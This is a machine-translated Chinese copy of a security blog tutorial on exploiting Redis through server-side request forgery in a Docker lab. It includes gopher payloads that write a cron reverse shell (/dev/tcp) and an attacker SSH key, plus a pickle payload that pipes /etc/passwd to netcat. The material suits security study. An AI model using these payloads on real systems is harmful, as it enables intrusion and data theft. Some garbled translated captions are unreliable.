<html>
<head>
<title>Exploiting Redis Through SSRF Attack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过SSRF攻击利用Redis</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-redis-through-ssrf-attack-be625682461b?source=collection_archive---------1-----------------------#2021-10-16">https://infosecwriteups.com/exploiting-redis-through-ssrf-attack-be625682461b?source=collection_archive---------1-----------------------#2021-10-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3479" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Redis是一种内存中的数据结构存储，用于存储键值形式的数据，可以用作数据库、序列化/会话存储、缓存和作业队列。</p><p id="d87f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，在Django和Flask框架中，Redis可以用作会话实例，或者在Gitlab中使用Redis作为作业队列。</p><p id="9cb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Redis使用了一个<code class="fe kl km kn ko b">Text Based line protocol</code>，所以可以使用<code class="fe kl km kn ko b">telnet</code>或<code class="fe kl km kn ko b">netcat</code>来访问它，而不需要特殊的软件来访问Redis实例，但是Redis有一个官方的客户端软件叫做<code class="fe kl km kn ko b">redis-cli</code>。‌</p><p id="8ad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Redis支持2种类型的命令:</p><p id="0386" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">‌ <strong class="jp ir"> 1。</strong>非<strong class="jp ir"> - </strong> RESP (REdis序列化协议)格式通过使用空格作为分隔符。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi kp"><img src="../Images/2a82b6138842afee3ba4009aabf36417.png" data-original-src="https://miro.medium.com/v2/resize:fit:990/0*vwJ8c9J5-fQvD_xr"/></div></figure><p id="32c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2。</strong> RESP格式，更推荐这种格式(因为这是Redis请求/响应的标准格式)，此外，如果Redis请求中有引号( " )等特殊字符，使用这种格式可以避免语法错误。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/328cce38e771e25967be451cead5b63c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1108/0*7PoLH8DEMwNKqNhV"/></div></figure><h1 id="fb38" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">雷迪斯·command‌</h1><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lw"><img src="../Images/23a553d80f02aac461f93ed392e0bb8b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BnKwS72lSCgOJY8Fjt2RFQ.png"/></div></div></figure><h1 id="4f2e" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis持久性</h1><p id="2b00" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">Redis将数据存储在内存中，因此当服务器重新启动时，数据将会丢失，因为RAM是易失性存储，为了避免这个问题，Redis具有持久性功能，可以将数据保存到硬盘上。</p><p id="9949" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Redis提供了两种类型的持久性:‌</p><ul class=""><li id="54f2" class="mg mh iq jp b jq jr ju jv jy mi kc mj kg mk kk ml mm mn mo bi translated">RDB (Redis数据库备份),每次执行“<code class="fe kl km kn ko b">SAVE</code>”命令时，都会将数据保存到硬盘上</li><li id="3597" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">AOF(仅附加文件)会在每次执行操作时将数据保存到硬盘上(基本上它的功能就像<em class="mu"> Bash Shell </em>在每次成功执行命令时将命令历史保存到<code class="fe kl km kn ko b">.bash_history</code>)。</li></ul><p id="6193" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">persistence‌的Redis配置参数</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mv"><img src="../Images/9e30466b6d780eb87250bf7cf4295899.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v0gWWBDe4bjqkNYqUPkLAw.png"/></div></div></figure><p id="3190" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">AOF并不是编写文件的好选择(在这篇博文中的SSRF的上下文中)，因为Redis不允许使用<code class="fe kl km kn ko b">CONFIG SET</code>命令(在运行时)更改AOF文件名(默认情况下:<em class="mu"> appendonly.aof </em>)，而是必须通过编辑文件<code class="fe kl km kn ko b">redis.conf</code>直接完成。</p><h1 id="d38a" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis漏洞</h1><p id="d2c5" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">最后一个影响雷迪斯的漏洞利用是本墨菲发现的<strong class="jp ir"> <em class="mu">雷迪斯EVAL卢阿沙盒逃逸——CVE-2015–4335</em></strong>。但是，Redis 2 . 8 . 21版和3.0.2版修复了此问题。‌</p><p id="c61a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在写这篇博文的时候，还没有直接在Redis实例上获取RCE的漏洞，但是攻击者可以利用“持久性”特性，或者可能利用相关应用程序的不安全序列化，这样它就可以被用作获取RCE的技术。此外，还有“<a class="ae mw" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" rel="noopener ugc nofollow" target="_blank"> Redis后开发</a>”发现帕维尔托波尔科夫得到RCE对Redis的实例。</p><h1 id="a986" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis Vs HTTP</h1><p id="d7c8" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">Redis和HTTP都是基于文本的协议，所以HTTP可以用来访问Redis，但是因为它有可能导致安全问题，自从发布了<em class="mu"> Redis 3.2.7 </em>，使得<em class="mu"> HTTP Header </em> <code class="fe kl km kn ko b">HOST</code>和<code class="fe kl km kn ko b">POST</code>作为<em class="mu"> QUIT </em>命令的别名，然后用消息<em class="mu">记录检测到可能的安全攻击。看起来好像有人在向Redis发送POST或Host:命令。这可能是由于攻击者试图使用跨协议脚本来危害您的Redis实例。连接中止。</em>生成Redis日志。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mx"><img src="../Images/b997a93f09d407914dc7440526cc2964.png" data-original-src="https://miro.medium.com/v2/resize:fit:844/0*3uEt1mxZIqlsYDRP"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">他说:“我们需要一个团队来领导我们的工作。</figcaption></figure><p id="42be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果要强制HTTP与Redis ≥ <em class="mu"> 3.2.7 </em>通信，需要在GET参数段使用SSRF (GET方法)+ CRLF注入。为了避免<em class="mu"> POST </em>和CRLF注入关键字，<em class="mu"> HOST </em> Header将位于Redis命令之后的位置。‌</p><p id="185d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">花絮</strong>:别名POST to QUIT是根据news.ycombinator.com论坛成员<em class="mu"> geocar </em>的建议创建的。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nc"><img src="../Images/619a9c44a86ff6e96414602cf6a37459.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*VmM-u3MLPcqnXoG8"/></div></div></figure><p id="a030" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">‌</p><h1 id="4320" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">实验室设置</h1><pre class="kq kr ks kt gt nd ko ne nf aw ng bi"><span id="5a6a" class="nh kz iq ko b gy ni nj l nk nl">$ git clone <a class="ae mw" href="https://github.com/rhamaa/Web-Hacking-Lab.git" rel="noopener ugc nofollow" target="_blank">https://github.com/rhamaa/Web-Hacking-Lab.git</a></span><span id="be5d" class="nh kz iq ko b gy nm nj l nk nl">$ cd SSRF_REDIS_LAB</span><span id="b010" class="nh kz iq ko b gy nm nj l nk nl">$ docker-compose build &amp;&amp; docker-compose up‌</span></pre><h1 id="03d9" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">实验室信息</h1><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nn"><img src="../Images/3e96d073940920c5028dc50c3bff0537.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wAq2dhhJg0jaqb4zWVLw7w.png"/></div></div></figure><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi no"><img src="../Images/b68a7a05577d3b89ba5c3cdc1a8568f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*vFh_eqUC88_KeD8R"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">SSRF实验室网站</figcaption></figure><blockquote class="np nq nr"><p id="2b88" class="jn jo mu jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">这篇博文中<a class="ae mw" href="https://github.com/rhamaa/Web-Hacking-Lab/blob/master/SSRF_REDIS_LAB/payload_redis.py" rel="noopener ugc nofollow" target="_blank"> payload_redis.py </a>生成的每一个有效载荷，都会作为URL输入到SSRF实验室的网页中，所以不需要截图给实验室。给出这些信息是为了不混淆如何攻击。</p><p id="e1cb" class="jn jo mu jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">默认情况下，redis以“Redis”用户的低特权运行。在实验中，我们使用root权限来写入crontab和authorized_key ssh，因为用户“redis”没有权限写入这两个文件。‌</p></blockquote><h1 id="d70a" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">雷迪斯和SSRF</h1><h1 id="a15f" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">雷迪斯-cron‌</h1><p id="d885" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">Cron是Linux上的一个任务调度器，cron会根据设定的时间定期执行使用<code class="fe kl km kn ko b">crontab</code>命令设定的命令。</p><p id="8aeb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Cron将crontab文件存储在<code class="fe kl km kn ko b">/var/spool/cron/&lt;Username&gt;</code>(Centos)<code class="fe kl km kn ko b">/var/spool/cron/crontabs/&lt;Username&gt;</code>(Ubuntu)中，系统范围的crontab文件存储在<code class="fe kl km kn ko b">/etc/crontabs</code>中。‌</p><p id="22d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实验将使用两种不同的操作系统，因为Centos上的cron和Ubuntu之间的行为略有不同。</p><pre class="kq kr ks kt gt nd ko ne nf aw ng bi"><span id="43aa" class="nh kz iq ko b gy ni nj l nk nl">$ python payload_redis.py cron</span><span id="a569" class="nh kz iq ko b gy nm nj l nk nl">Reverse IP &gt;</span><span id="d0d2" class="nh kz iq ko b gy nm nj l nk nl">Port &gt;</span><span id="0169" class="nh kz iq ko b gy nm nj l nk nl">Centos/Ubuntu (Default Centos)</span><span id="81a4" class="nh kz iq ko b gy nm nj l nk nl">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A</span><span id="16b3" class="nh kz iq ko b gy nm nj l nk nl">%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2477%0D%0A%0A</span><span id="1495" class="nh kz iq ko b gy nm nj l nk nl">%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20/bin/bash%20-c%20%27sh%20-i%20%3E</span><span id="8fb2" class="nh kz iq ko b gy nm nj l nk nl">%26%20/dev/tcp/b%27XXX.XXX.XXX.XXX%27/8080%200%3E%261%27%0A%0A%0D%0A%</span><span id="2420" class="nh kz iq ko b gy nm nj l nk nl">2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A</span><span id="b654" class="nh kz iq ko b gy nm nj l nk nl">%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243</span><span id="b01f" class="nh kz iq ko b gy nm nj l nk nl">%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D</span><span id="18b2" class="nh kz iq ko b gy nm nj l nk nl">%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A‌</span></pre><p id="d608" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Ubuntu实验室</strong> ‌</p><p id="68cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Redis将使用0644权限写入文件，而ubuntu上的crontab文件预计将使用0600权限，因此它会在系统日志中给出警告。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nv"><img src="../Images/1f5d5aef458b29b6bc1d928ac3f471cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*4pJjSEyPp3F1B9KC"/></div></div></figure><p id="a466" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，<em class="mu"> Redis RDB </em>文件中存在<em class="mu">伪</em>数据，导致cron因为存在无效语法而忽略crontab文件，所以即使crontab文件拥有<em class="mu"> 0600 </em>权限，也不会被执行。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nw"><img src="../Images/630ce2ac768d12ed8d91da2b9fe20380.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*NoutqBHdIW2Rl5y1"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">Cron语法错误</figcaption></figure><blockquote class="nx"><p id="c37e" class="ny nz iq bd oa ob oc od oe of og kk dk translated">通过SSRF用Redis编写crontab文件在Ubuntu中无法正常工作，因为Ubuntu中的crontab文件需要0600权限才能执行，并清除导致语法错误的伪数据。</p></blockquote><p id="6d6e" class="pw-post-body-paragraph jn jo iq jp b jq oh js jt ju oi jw jx jy oj ka kb kc ok ke kf kg ol ki kj kk ij bi translated"><strong class="jp ir"> Centos实验室</strong></p><p id="aa75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Centos上，即使crontab文件具有权限0644并且存在虚拟数据，cron仍将被执行，以便它可以获得反向shell。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi om"><img src="../Images/81d4df5ad102bf68f76a9aa41efb7f22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*shBItfW3EtBHN0a0"/></div></div></figure><h1 id="1057" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis — SSH公共密钥</h1><p id="f4ad" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">‌Authorized_keys用于存储SSH公共密钥列表，以便用户使用SSH私有-公共密钥对而不是密码登录。授权_钥匙位于<code class="fe kl km kn ko b">$HOME/.ssh/authorized_keys</code></p><p id="8cb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果<code class="fe kl km kn ko b">$HOME/.ssh/authorized_keys</code>是可写的，这可以用来存储攻击者的SSH密钥。</p><pre class="kq kr ks kt gt nd ko ne nf aw ng bi"><span id="ce57" class="nh kz iq ko b gy ni nj l nk nl">$ python payload_redis.py ssh</span><span id="2925" class="nh kz iq ko b gy nm nj l nk nl">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D</span><span id="9c1b" class="nh kz iq ko b gy nm nj l nk nl">%0A%241%0D%0A1%0D%0A%24403%0D%0A%0D%0A%0D%0Assh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQD</span><span id="a051" class="nh kz iq ko b gy nm nj l nk nl">c4B6PTML3xiqId/qw8cJkPmwSbtdOsAS2IGUUk1ifRHZsdfgcFvj7fzMFo1ydGAOuZcGPeT838LQ3R8ruWe4B</span><span id="f2e0" class="nh kz iq ko b gy nm nj l nk nl">788Q5ZKRO6CZSoEmqs4FWuCz7QvwWu9%2B2kMH/6gUvVQAQNYD2RACXgJcCAm77bg/WHZfgGJYNtOKDUf%2B0</span><span id="4a2f" class="nh kz iq ko b gy nm nj l nk nl">V1ku%2B/h8ijsQJdkuk5Zr7w1xjOdigLs8ST7MivptfYGvbnh/XUk3Y2EfyoACmW0MpcnthdLL3s/8SOs5exe</span><span id="6130" class="nh kz iq ko b gy nm nj l nk nl">kRNYYU9rn74itibDHlsYvukBtKhW/XOAPZ3T38qDf7PJyqPoOl%2BAQ8AaFwIBVfE7V1mPRCqZLkG97SRjMy1</span><span id="1630" class="nh kz iq ko b gy nm nj l nk nl">V9dhTgG4h%20rhama%40Inspiron-7472%0D%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0A</span><span id="e29c" class="nh kz iq ko b gy nm nj l nk nl">set%0D%0A%243%0D%0Adir%0D%0A%2410%0D%0A/root/.ssh%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A</span><span id="2859" class="nh kz iq ko b gy nm nj l nk nl">%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A</span><span id="2454" class="nh kz iq ko b gy nm nj l nk nl">%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A</span><span id="7b59" class="nh kz iq ko b gy nm nj l nk nl">====================================================</span><span id="5d2b" class="nh kz iq ko b gy nm nj l nk nl">After payload executed, try ssh root@server_hostname</span><span id="c639" class="nh kz iq ko b gy nm nj l nk nl">====================================================</span></pre><p id="9f53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使存在虚拟数据，也可以访问Ubuntu和Centos Lab ssh。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi on"><img src="../Images/b18c27861a6966ce870145253c5bafda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*DHISSnZrAAUfKXdF"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">宋承宪ke Ubuntu实验室</figcaption></figure><h1 id="dc55" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis作为会话存储</h1><p id="b93b" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">后端服务器经常使用Redis作为会话存储，在Redis web lab中，会话存储将重点利用<em class="mu">不安全序列化</em>，因为<em class="mu">会话</em>通常是以对象的形式存在的，为了将这些对象存储到Redis中，必须将会话对象转换成字符串。将对象转换为字符串的过程称为“<strong class="jp ir"> <em class="mu">序列化</em> </strong>”，将字符串转换为对象的过程称为“<strong class="jp ir"> <em class="mu">反序列化</em> </strong>”。</p><p id="54b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实验室使用来自<a class="ae mw" href="http://flask.pocoo.org/snippets/75/" rel="noopener ugc nofollow" target="_blank">服务器端会话的示例片段将<em class="mu"> Redis实现为会话存储</em>，Redis </a>和<em class="mu"> Pickle </em>用作<em class="mu">序列化器</em>，Pickle是已知的不安全的，可被利用来获取RCE。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/261c489358528041587684432b24cec1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1264/0*2cDbYwpLJ7ykyBfL"/></div></figure><p id="c555" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击流程非常简单，我们只需要通过SSRF改变有效载荷Pickle的会话值。根据源代码中的逻辑，会话将被序列化并进行base64编码。</p><p id="7f2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了能够更改存储在Redis中的会话值，您需要一个密钥名，在本实验中，会话将以名称<code class="fe kl km kn ko b">session:&lt;session_id&gt;</code>存储</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi op"><img src="../Images/dd71742de6e784303c975444b5540e79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1374/0*wxb5YizgJqRuXXmO"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">使用redis-cli检查Redis中的存储值</figcaption></figure><p id="03d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用名为开发人员工具的默认web浏览器功能来查看会话Id</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/9a131c409f0dd1b6b251a64ae47e25ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1318/0*vm-L3mbZ5dm3tBF9"/></div></figure><p id="971a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">琐事:烧瓶内部</strong></p><p id="a5e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当请求即将结束或视图返回时，Flask将在内部调用<code class="fe kl km kn ko b">finalize_request</code>方法，然后在<code class="fe kl km kn ko b">finalize_request</code>方法中有另一个对从<code class="fe kl km kn ko b">session_interface</code>类调用<code class="fe kl km kn ko b">save_session</code>的<code class="fe kl km kn ko b">process_response</code>方法的调用，<code class="fe kl km kn ko b">save_session</code>方法将保存会话的值(在这篇博文的上下文中，会话值将保存到Redis)。</p><p id="50ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为什么这些信息很重要？因为当我们试图通过SSRF更改Redis中flask会话的值时，我们之前通过SSRF更改的值将被原始值覆盖。</p></div><div class="ab cl or os hu ot" role="separator"><span class="ou bw bk ov ow ox"/><span class="ou bw bk ov ow ox"/><span class="ou bw bk ov ow"/></div><div class="ij ik il im in"><p id="d1a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Pickle-Redis实验室中，至少有3种情况可以对RCE进行存档:</p><ol class=""><li id="d1c5" class="mg mh iq jp b jq jr ju jv jy mi kc mj kg mk kk oy mm mn mo bi translated">当SSRF有效载荷被执行时，我们同时访问其他端点，例如<code class="fe kl km kn ko b">/login</code>(这个方法可以使用<em class="mu">多线程/多处理</em>)因为当访问其他端点时，Flask会调用<code class="fe kl km kn ko b">session_interface</code>类的<code class="fe kl km kn ko b">open_session</code>方法，然后检索会话值(所以要避免<code class="fe kl km kn ko b">save_session</code>)。</li><li id="11ae" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk oy mm mn mo bi translated">更改Session-Id的值，然后将有效负载Pickle写入修改后的Session-Id，例如会话Id是AAAA-AAAA-AAAA-AAAA，我们可以将其更改为AAAA-AAAA-AAAA-AAAB，然后将AAAA-AAAA-AAAA-AAAA-AAAB设置为Key，稍后只需在客户端使用AAAA-AAAA-AAAA-AAAA-AAAB，以便Flask读取会话Id的值。</li><li id="81db" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk oy mm mn mo bi translated">使用主从Redis功能(用<code class="fe kl km kn ko b">SLAVEOF</code>命令通过SSRF触发)，然后直接通过主服务器更改值，因为主服务器中发生的任何更改都会自动同步到从服务器。‌</li></ol><p id="35ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这篇博文中，我们将选择场景2，</p><pre class="kq kr ks kt gt nd ko ne nf aw ng bi"><span id="2a5d" class="nh kz iq ko b gy ni nj l nk nl">$ python2 payload_redis.py pickle</span><span id="821b" class="nh kz iq ko b gy nm nj l nk nl">Key name &gt; session:8ac1cb48-5064-4067-9e43-ed0df6856425</span><span id="4a1c" class="nh kz iq ko b gy nm nj l nk nl"><a class="ae mw" href="http://127.0.0.1:6379/_%0D%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%2444%0D%0Asession%3A8ac1" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:6379/_%0D%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%2444%0D%0Asession%3A8ac1</a></span><span id="28b7" class="nh kz iq ko b gy nm nj l nk nl">cb48-5064-4067-9e43-ed0df6856425%0D%0A%2492%0D%0AY3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgL2V0Y</span><span id="9a57" class="nh kz iq ko b gy nm nj l nk nl">y9wYXNzd2QgfCBuYyAxMjcuMC4wLjEgOTA5MScKcDEKdHAyClJwMwou%0D%0A</span></pre><p id="96e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注</strong>:原Session-Id<em class="mu">Session:8 ac1c b48–5064–4067–9e 43-ed 0 df 685642</em><strong class="jp ir"><em class="mu">6</em></strong>改为<em class="mu">Session:8 ac1c b48–5064–4067–9e 43-ed 0 df 685642</em><strong class="jp ir"/></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi oz"><img src="../Images/cb7abe12a5098900bfbfd386301bb7d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*_inzIHGbr3aWhCG-"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">Rce结果，cat /etc/passwd | nc IP端口</figcaption></figure><h1 id="9ddf" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis主从RCE</h1><p id="5189" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">这种后开发技术是由Pavel Toporkov引入的。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi pa"><img src="../Images/a7f55ec1c137faf759822b01dd0c7d9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nGgJBwUHc5QdujyCau2dXA.png"/></div></div></figure><p id="66dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我会写一篇单独的博客来解释更多关于这种后利用技术的内容。</p><h1 id="a3d1" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Redis作为作业队列</h1><p id="e0ce" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">使用Redis作为作业队列获取RCE的例子可以参考LiveOverFlow Video。</p><figure class="kq kr ks kt gt ku"><div class="bz fp l di"><div class="pb pc 